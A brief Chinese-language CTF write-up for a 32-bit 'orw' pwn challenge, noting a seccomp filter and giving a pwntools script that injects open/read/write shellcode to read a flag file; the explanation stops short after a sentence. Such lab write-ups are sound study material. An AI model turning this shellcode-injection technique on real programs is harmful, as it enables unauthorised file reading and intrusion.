checksec发现是32位

![image-20201218163532756](https://static.hack1s.fun/images/2021/02/06/image-20201218163532756.png)

直接输入shellcode，然后执行

![image-20201218163625301](https://static.hack1s.fun/images/2021/02/06/image-20201218163625301.png)

这个题目前面有一个`orw_seccomp`函数，这个函数内部比较重要

有一个之前没听过的概念



```python
from pwn import *

io = process('./orw')
elf = ELF('./orw')

payload = asm(shellcraft.open('flag'))
payload += asm(shellcraft.read(3,'esp',100))
payload += asm(shellcraft.write(1,'esp',100))

io.sendline(payload)
io.interactive()
```

